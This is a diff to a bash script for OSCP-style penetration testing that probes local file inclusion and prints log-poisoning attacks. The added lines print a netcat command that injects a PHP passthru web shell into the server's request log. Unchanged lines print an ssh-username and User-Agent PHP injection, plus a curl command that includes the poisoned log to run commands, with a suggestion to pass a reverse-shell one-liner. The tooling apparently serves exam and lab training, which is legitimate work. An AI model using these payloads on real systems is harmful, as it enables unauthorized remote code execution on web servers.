@@ -1,5 +1,8 @@
 #!/bin/bash
 
+# Re-exec under bash if started with sh/dash (arrays & [[ ]] need bash).
+if [ -z "$BASH_VERSION" ]; then exec bash "$0" "$@"; fi
+
 # ==============================================================================
 # Advanced OSCP LFI, RFI, Wrapper & Log Poisoning Suite
 # Wordlist: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
@@ -214,6 +217,12 @@ fi
 # through the LFI and, when it is, PRINTS a ready-to-run log-poisoning
 # suggestion. It does not inject payloads or run commands on the target.
 WEB_ROOT="${URL%%\?*}"   # query stripped, used in the suggested poison request
+# Host for the suggested netcat poison. IMPORTANT: the log you include belongs to
+# the web service on its OWN port (commonly 80) and that may differ from the port
+# the LFI app runs on. Poison the service that actually writes the log you read.
+_hp="${URL#*://}"; _hp="${_hp%%/*}"
+POISON_HOST="${_hp%%:*}"
+REF_URL="https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/logs-poisoning"
 reachable_any=0
 
 # Fingerprints that indicate we are genuinely seeing log contents
@@ -261,13 +270,18 @@ for log in "${LOG_PATHS[@]}"; do
                 echo "         ssh '<?php system(\$_GET[\"${CMD_PARAM}\"]); ?>'@<target-ip>"
                 ;;
             *)
-                echo "      1) Poison it via the User-Agent header (logged on every request):"
-                echo "         curl -s -A '<?php system(\$_GET[\"${CMD_PARAM}\"]); ?>' '$WEB_ROOT'"
+                echo "      1) Poison via the REQUEST LINE with netcat (nc avoids URL-encoding"
+                echo "         the PHP tags). Send it to the web service whose log you're"
+                echo "         reading - usually PORT 80, which may NOT be the LFI app's port:"
+                echo "         printf 'GET /<?php passthru(\$_GET[\"${CMD_PARAM}\"]); ?> HTTP/1.1\\r\\nHost: ${POISON_HOST}\\r\\nConnection: close\\r\\n\\r\\n' | nc -nv ${POISON_HOST} 80"
+                echo "         (User-Agent poisoning via 'curl -A' only lands if Apache LogFormat"
+                echo "          is 'combined'; the request-line method also works with 'common'.)"
                 ;;
         esac
         echo "      2) Include the poisoned log and run a command:"
         echo "         curl -s '$exec_suggest'"
         echo "         (swap 'id' for whoami etc.; for a shell pass a reverse-shell one-liner)"
+        echo "      Ref: $REF_URL"
     else
         echo "    -> Not reachable at the tried paths (raise -d, try -v, or check the vhost path)."
     fi
